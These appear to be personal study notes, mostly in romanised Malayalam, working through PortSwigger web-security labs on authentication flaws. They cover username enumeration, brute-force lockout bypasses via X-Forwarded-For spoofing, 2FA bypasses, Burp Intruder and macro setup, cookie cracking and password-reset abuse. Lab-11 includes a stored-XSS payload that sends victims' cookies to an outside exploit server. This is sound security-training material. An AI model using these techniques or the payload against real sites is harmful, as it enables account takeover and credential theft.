Authentication is the process of verifying the identity of a given user or client.

most vulnerabilities in authentication mechanisms arise in one of two ways:
1) -   The authentication mechanisms are weak because they fail to adequately protect against ==brute-force== attacks.
2) -   Logic flaws or ==poor coding== in the implementation allow the authentication mechanisms to be bypassed entirely by an attacker. This is sometimes referred to as "broken authentication".

--------------------------------------------------------------------

3 section aayi aan ivide nammal padikunath :
     1) Vulnerabilities in password-based login
     2) Vulnerabilities in multi-factor authentication
     3) Vulnerabilities in other authentication mechanisms
	 
--------------------------------------------------------------------

### 1)Vulnerabilities in password-based login:
#### Brute force

            Lab-1(username enumeration via different responses)
-->ivide namuk oru login page brute force chyanam.username areela password areela.pakshe enth adich login chythalum username incorrect ennan kanikunath.ingane kanikunathkond thane adyam username enumerate chyam with bruteforce.
-->so aadyam username parameteril mathram bureteforce chyunu.password parameteril enthengilum value kodutha mathi
-->ini passwordum athupole kandethiko

           Lab-2(Username enumeration via subtly different responses)
-->ividem username,password adich login chyanam
-->pakshe nerthe pole username incorrect ennalla.invalid username and password. . ennan kanikunath
-->so burp il intercept chyuka.enit username parameter add kodukuka,password param enthegilum kodukuka
-->wordlist kodukuka
-->options tab il pokuka enit grep-extract il poi add click chyuka ennit ee invalid username and password. enna saathanam full ayit copy chyuka(including the full stop) enit ok koduthit start attack kodukuka
-->ee resultil onnil mathram last dot kanilla so athanu ivide username.
-->in nerthe pole password kandupidikuka

              Lab-3(Username enumeration via response timing)
-->ivide response time nokit aan hack chyunath
-->ividem namuk login bruteforce chyanam.pakshe korach attemp chyumbo thane limit aakum.ithil nokiyal kanam namude ip nokit aan limit chyunath
-->athukond thanne namuk X-FORWARDED-FOR: enna header use chyth spoof chyam
-->ivide sredhichal manasilakum username valid allengil response time same thanne aan.pakshe username valid aanengil namal passwordin kodukuna letters in anusarich response time koodum.ith test chyanayi oru sample credential namuk thanitund athvazhi manasilakam.
-->so x-forwaded-for:$add$ athupole username=$add$ kodukuka.type pitchfork aakuka.max-fraction-digits:0 kodukuka.ini start attack.password=1000letters kodukuka
-->result il columns->response received,response completed tick chyth nokit length nokiyal kanam onnil mathram length kooduthal kanam.athinartham nerthe paranjapole username sheriyayal passwordile letters inte length anusarich koodum.so athan username
-->ini sadharana pole password bruteforce chyth nokam

                   Lab-4(Broken brute-force protection, IP block)
-->ividem nammal kurach attemp chythal limit aakum.pine oru mint kazhinjite aaku
-->pakshe nerthe pole x-forwaded-for aakila
-->ivide rand bad attemp koduthit pine namude real account vech login chythit pinem rand bad attemp chythal lock out aakunila.so namuk enth chyamenal aadyam real account vech login chyuka then oru bad attempt chyuka pinem real account vech login chyuka oru bad attempt chyuka.ingane chythal bruteforce um chyam lock out um aakila
-->ee attack chyunathin mumb site il wait one minute enn kanikunundengil oru mint wait chythit venam attack chyan
-->ini rand payload file undakanam.onnil wiener thaze carlos(victim)ith thanne password inte lenth varunath vere copy paste chyuka.ini password inte edak peter(carlos inte passwd) kodukuka.so ingane attack chyumbol lock out aakila
==>REMEMBER-->nammal satharana bruteforce chyumbol payload one by one aayitalla attack chyunath orumich aayirikum.so ivide namuk one by one aayit thanne nadakanam.ilengi account lock out aakum.so ==resouce pool option il poi Maximum concurrent requests set 1 enn kodukuka==so one by one aayit attack nadaku
-->ini attack chyam.wiener inte avide 302 enum carlos ine 200 enum kanam.filteril poi carlos enn akuka.athil onn mathram 302 enn kanam athan carlos inte passwd.aayi.

                  Lab-5(Username enumeration via account lock)
-->chela websites account thanne lock chyum enthengilum suspecious activites nadanal.athayath valid aaya accountil invalid aaya passwd kore pravisham koduthal aa account korach nerathek lock aakum
-->ee logic aan nammal exploit chyunath.athayath valid aaya accountil kore pravisham passwd adich login chyumbol automatic aayi aa username lock aakum valid allengil lock chyenda aavisham varunila
-->so login POST form intercept chyuka.intruderil poi cluster bomb select chyuka.username parameter $add$ kodukuka athupole password=test$add$ enn kodukuka.first set il username wordlist kodukuka.second set il null enna payload type select chythit generate 5 payloads enn select chyuka.karanam oru user 5 pravisham attack chyum(sadharana minimum 5 pravisham engilum login chythalanalo account lock out aakuka).angane oro username 5 pravisham run aakum.ingane chyumbol ithil ethengilum oru username valid aaya username aanengil result ile lengthil matam indavam.invalid allengil invalid username or password enn kanikum.valid aaya username aanegil You have made too many incorrect login attempts. Please try again in 1 minute(s) enn kanikum athinartham ee account lock aaki athinartham ee username valid aan.
-->username kandethiyal pinne password kandetham sniper aakuka enit password wordlist kodukuka ennit attack chyunathin mumbai options il pokuka grep-extract il poi Invalid username or password. ennath select chyth ok kodukuka enit attack chyuka apol ithil oru password il mathram ith kanikila so athan passwd.aayi

    Lab-6(Broken brute-force protection, multiple credentials per request)
-->ividem nammal bruteforce chyth login chyanam
-->ivide nammal login chyth ayakunath oru json aayi aan pokunath
-->ivide namuk carlos aayan login chyendath
-->so aa json inle password il oru valiya array of password wordlist koduth send chythal athil ethengilum password carlosinte aanengill login aakum
-->documents il text-json enn file il aan ee wordlist ullath nokiyamathi


### 2)Vulnerabilities in multi-factor authentication:
-->satharana nammal nammude password mathram adichan authenticate chyar
-->pakseh ipol some websites 2 factor authentication vazhi mathrame authenticate/login chyiku athayath password um pine athinte koode some other biometric aayitulatho some otp angane enthengilum use chyth authentication ok

                        Lab-7(2FA simple bypass)
-->satharana 2fa nadakunath il rand credentialsum kiti kazhinjitan login chyunath.enal chila website il aadyathe password koduthit next 2fa kodukuna samayath already login state il aayirikum.apol namuk aa randamathe step skip chyan patumo enn nokam
-->ivide rand username passwordum thanitund onnamathe nammude thanne aan ie,wiener:peter ithil aadyam keruka enit 2fa ennath email il varuna otp code aan ath koduth keruka ennit account page il pokuka enit aa url save chyuka enit randaamthe victim nte account login chyuka
-->ivide namuk password und but 2fa chyan email ila.email undegile otp kitu so otp kodukenda avide onum kodukanda pakaram mukalil url il nerathe save chytha url paster chuka enit  ......my-account?id=carlos enn kodukuka.carlos aanalo victim so aa peru kodukanam.apol login aakum.
-->ivide website verify chyunila athayath password adich keriya aal thane aano 2fa otp adichath enn verify chyunila.athan prasnam.

                    Lab-8(2FA broken logic)
-->ivide aadyathe password step kazhinj randamathe 2fa step il same user thanne aan randamathe details um tharunath enn confirm chyan oru cookie use chyunu.ivide verify enna parameteril = username koduth aan verify chyunath.ith aan namma exploit chyunath
-->so aadyam nammal real username password adich keri enumerate chyunu.ivide namuk puthiya cookie kitunu.so GET request il namuk kitum. GET /login2 ennathil poyi nokiyal kanam.so ath repeater il kondupokuka ennit avide vech verify=wiener ennath carlos aaki send adikuka.respons il enter 4 digit pin enn kandan manasilakiko namuk aa parameter il mattu username kodukamen
-->ivide carlos enna user aayan namuk 2fa bypass chyth login chyendath
-->so wiener username logout chyuka.ennit again weiner aayi login chyuka
-->ee pravisham otp enthengilum kodukuka ennit ath intercept chyuka
-->remember nerthe namuk cookie ingot kiti so GET request aan ivide nammal otp angot koduthu so POST request aan nokendath so POST /login2 edukuka ennit intruderil kondupokuka
-->enit verify parameter=carlos kodukuka mfa-otp=$add$ kodukuka enit payload type bruteforcer edukuka
-->start attack 10000 payloads undakum athil onnil real otp undakum 302 status il .ok

                     Lab-9(2FA bypass using a brute-force attack)
-->ee lab chyunathin mumb macros ine patti arinjirikanam.namal pentest chyumbol pala karyangal kond namuk thasassangal undakum.session time out,anti-csrf token kitathe aakum,namal pala request kodukumbol app logout chyunath... so angane nammal session out okke akunundengil macros use chyth aa session out aakatha reethiyilmacros aa session retry chyth authenticate chym.so valiya web app okke test chyuna samayath ee session out akunatho mato error veram apol enth karanam kondan out aakunath enn kandethi ath auto authenticate/retry chyth namuk sesson nilanirtham.burp il active scan oke chyumbol ingaen sambavikam apol macros use chyam
-->burp il project options ->sessions il cookie jar enna optionil poi nokiyal kanam enthoke cookies burp save chythitunden.ee cookies vechan burp oro request um chyunath.namuk vendath enthennal automatic aayi ee cookies mari varanam oru thadasavum ilathe.athayath oro thavan repeater,scanner... oke request nadathumbol ee session valid aano ennu nokum valid allengi cookie jar puthiyath update chyanam
-->so session->session handling rules->add click chyth rule name kodukuka athupole thazhe add click chyth eth type aan vendath enn select chyuka.ini main aayit oru karyam chyanam athayath ==how burp identifies if session is not valid?== athin correct aayit oru unique expression nammal kandethanam.athayath session out aayal chelapo website nere login page ilek redirect(302 ie,/login.jsp) chyunatho mato.ath kandetho expression option il kodukanam -/login.jsp.ini athinte thazhe DEFINE BEHAVIOUR DEPENDENT ON SESSSION VALIDITY enn kanikum.ithum valare importand aan.karanam burp in manasilaki kodukanam eth request il ninuman puthiya session undakendath enn ilengi nadakoola.click add button. main aayi login chyuna requestum session cooke kituna request um kodukanam.enit test macro kodukuka enit analise chyth nokanam puthiya session kitunundon.athupole URL SCOPE il include all url enn kodukanam.
-->ithrem chyth kazhinjal pine intruder,repeate,scanner... ellthilum test chyam session out aakila.ee lab il brute force aan chyendath.ok. ini lab ilek kadanam

-->ivide namuk carlos aayi aan kerendath.username,passwd und but 2fa otp kode kitanula email illa.ividuthe prathyekatha enthennal otp code rand ivalid attemp chythal nammal nere login page ilek redirect aakum.so pinem username,passwd adich keriyale attemp chyan patu.ith thane aan namal exploit chyunath.athyath rand pravisham attemp chythal automatic aayi login page ilek pokunath kondthane namuk macros use chyth aa csrf token update chytha mathi apol oro attempt ilum token update aakum so account lock out aakila.
-->ivide csrf token use chyunund so again namal login chyathe burp il poi bruteforce chythal invalid csrf token ennu kanikum so namude main agenda ennth thane csrf token update chyuka enathan athum bruteforce in badhikathe
-->so aadyam carlos:montoya adich keruka enit enthengilum otp kodukuka ini burp->proxy->histrory il namuk oru requestum kanam.ithil main aayi 3 request und ie,
       1) GET /login - namal website il login form request chyunath
	   2) POST /login - username,password adich adutha step ilek kerunath
	   3) GET /login2 - namuk puthiya session kitunu
ee moon request vechan nammal macros undakunath
-->so adyam project optionil pokuka select session scope il poi include all urls select chyuka.ini add click chyth run a macro enn kodukuka enit ee moon requst select chyth ok kodukuka enit test macro click chyth GET /login2 in ninum epozhum kanikarulla enter 4 digit pin enn response il kanikunundo enn nokuka angane kanikunundengil macros work chyununden artham.ini muthal automatic aayi session aayikolum lock out aakila
-->ini http history il poi POST /login2 in ninum nerethe namal enthgilum otp adikan paranjile aa request select chyth intruder il aakuka enit token parameter select chyuka
-->payload type numbers select chyuka 0-9999 akuka min,max lenth 4 akuka.min max fraction digit 0 kodukuka
-->resource pool il poi concurrent request 1 kodukuk.delay oru 100 kodukuka ini start attack kodukuka


### 3)Vulnerabilities in other authentication mechanisms:

                  Lab-10(Brute-forcing a stay-logged-in cookie)
-->ivide namuk web appil ninum exit ayalum login chyan aayi stay logged in function thannitund so namal ath click chythitan kerunathengil namuk  stay-loggded-in enna cookie il save aayi kidakum
-->so inspector tab il cookie option il ninum manasilakan ith base64 ecoded aanen
-->so aa base64 decoder il poi decode chyuka apol - weiner:--some md5hash-- enn kanikum
-->aa md5 hash namude password aano en kandethuka.yes athuthanne
-->cookie il password ital namuk ath exploit chyan patum
-->so base64(username:md5hash of pssword) enna format il aan ee cookie undakunath
-->ini aa request intruderil iduka enit ee stay-logged-in enn cookie ile aa base64 add koduthit payload il poi namude password wordlist kodukuka
-->start attack kodukunathin mumb athe format il nammal karyangl kodukanam enale nadaku.so ivide aadyam 1)base64 decode chyunu 2)pine username: kodukunu 3)pine md5 hash aakunu so ath namal reverse aayi payload processing ena optionil koduknama ie,first mdf has aakanam second add prifix koduth username carlos: ennakodukanam thirdly base64 encode en koduthit venam attack chyan.resultil onnil mathram length vere undakum ath aan carlos ine stay-logged-in cookie so athile md5 decrypt chythal avante passwordum kitum.ok aayi
-->ith attacker in swanthamyi account undakan ulla avastha ulla karyama paranjath chila samayath attackerin account undakan patila so cookies kananum patila angane ulla sandharbhangalil xss polula bugs upyogich mattulavarude cookie edukuka enit aa cookie analize chyuka.

                     Lab-11(Offline password cracking)
-->ividem stay logged in feature und.so aa cookie eduth decrypt chythal nerthe pole base64(username:md5hashpasswd) aan ullath.ivde blog comment il stored xss vulnerability und so nammal portswigger inte thane oru exploit server use chyunu victims inte cookie kitan
  <script>document.location='//your-exploit-server-id.web-security-academy.net/'+document.cookie</script>
-->ith comment il adich it save chyuka enit eploit server il access log adikuka apol aa page visit chytha victims inte cooke kitum.so aa cookie base64 decode chyth hash decrypt chythal password kitum
-->ini aa pssword vech carlos aayi login chyth carlos inte account delete chyuka.aayi

                  Lab-12(Password reset broken logic)
-->ivide password reset chyunath exploit chyunathan padikunath
-->forgot password adikuka enit namude username kodukuka.ini email il poi nokiyal oru valiya link indakum athil click chyth venam new passwd set chyan
-->so nammal burp il poi ee request eduth repeateril ittit enumerate chyuka
-->ivide temp-forgot-password-token enna oru parameter undakum athil token undakum.so aa token angane thane clear chythit aa request send chyuka.token illatheyum password reset aakumen apo kanan sadhikum
-->so ivide namuk carlos inte password matam.athin ithupole token remove chyuka enit username carlos enn kodukuka new paasws enthelim koduthit send chythal carlosinte password change aakum.aayi
-->burp post request il http header pole username,password parameter undakile etavum last aayit avidem ee same token parameter undakum avidem clear chyanam.

                Lab-13(Password reset poisoning via middleware)
-->ivide x-forwarded-host manasilayila so pine noka


                 Lab-14(Password brute-force via password change)
-->ivde forgot password aan nammal exploit chynath
-->notice- nammal wrong current password adichit new passwd,confirm new passwd same adichal account lockout aakum
-->current password valid adichit matteth randum different ital - **New passwords do not match enn kanikum**
-->athupole curernt passwd,new passwd,confirm new passwd moonum diiferent koduthal - **Current password is incorrect** en kanikum account lock out aakukayum ila
-->ivide username kodukan ulla form ila but burp il nokiyal kanam username hidden aayi kodukunenden
-->so namuk burp il poi username=carlos enn akuka ennit current-password=$add$ kodukuka enit new passwd um confirm new passwordum different kodukuka so account lockout aakila
-->wordlist kodukuka enit attack chyunathin mumb optionil pokuka enit grep-match il poi ee **new password do not match** ennath kodukuka.karanam njan paranju current passwd valid aanegil matteth randum different aanengil ee msg kanikumen.
so brute force chyumbol athil ethengilum onu valid aaya carlos inte passwd aanengil ee msg aayirikanamalo varendath athukondan ith match chyan kodukunath.
-->so result il etho onnil ee msg varum athan carlos inte password.
-->grep-match il current password is incorrect enn koduth attack chythalum namuk password kitum.